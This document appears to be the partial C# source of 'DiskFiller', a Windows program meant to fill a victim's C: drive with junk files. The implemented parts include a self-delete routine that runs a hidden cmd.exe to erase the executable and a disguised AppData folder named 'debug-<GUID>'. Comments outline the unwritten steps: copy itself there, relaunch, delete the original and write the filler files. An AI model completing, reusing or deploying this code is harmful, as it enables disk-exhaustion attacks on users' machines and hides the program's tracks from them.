using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Windows.Forms;



namespace DiskFiller
{
    internal partial class DiskFiller : Form
    {
        internal struct ApplicationPaths
        {
            internal string appdata;
            internal string currentFolder;
            internal string currentFullPath;
            internal string diskFillerFolder;
        }



        private readonly string applicationName = string.Empty;
        private readonly ApplicationPaths finalPaths;



        internal DiskFiller()
        {
            // Check if application should run
            if (GetFreeDiskSpace(@"C:\") <= 4)
            {
                DestroySelf();
            }



            finalPaths = GetApplicationPaths();

            applicationName = finalPaths.currentFullPath.Replace(finalPaths.currentFolder, string.Empty).Substring(1);



            // Check if file is not in wanted folder
                // Copy application to appdata
                // Start application from new folder
                // Exit and destroy current application



            // Prepare the content which will be written to the files



            // Start the writing



            InitializeComponent();
        }



        /// <summary>
        /// Gets the free space of a disk with a given name
        /// </summary>
        /// 
        /// <returns>
        /// The free disk space in gb
        /// </returns>
        private double GetFreeDiskSpace(string diskName)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.Name.Equals(diskName))
                {
                    return drive.TotalFreeSpace / (1024 * 1024 * 1024);
                }
            }

            return -1;
        }



        /// <summary>
        /// Delete application in 1 second and close the process in the meantime
        /// </summary>
        private void DestroySelf()
        {
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch
            {

            }

            Environment.Exit(0);
        }



        /// <summary>
        /// Gets all the needed folder paths and the current file name for further purpose
        /// </summary>
        /// 
        /// <returns>
        /// A struct which is defined at the beginning of the file but with all the values filled
        /// </returns>
        private ApplicationPaths GetApplicationPaths()
        {
            ApplicationPaths appPaths = new ApplicationPaths()
            {
                appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                currentFullPath = Application.ExecutablePath
            };

            string currentFullPath = appPaths.currentFullPath;

            appPaths.diskFillerFolder = $@"{appPaths.appdata}\debug-{Guid.NewGuid()}";
            appPaths.currentFolder = currentFullPath.Replace(currentFullPath.Split(Convert.ToChar(@"\")).Last(), string.Empty);
            appPaths.currentFolder = appPaths.currentFolder.Substring(0, appPaths.currentFolder.Length - 1);

            return appPaths;
        }
    }
}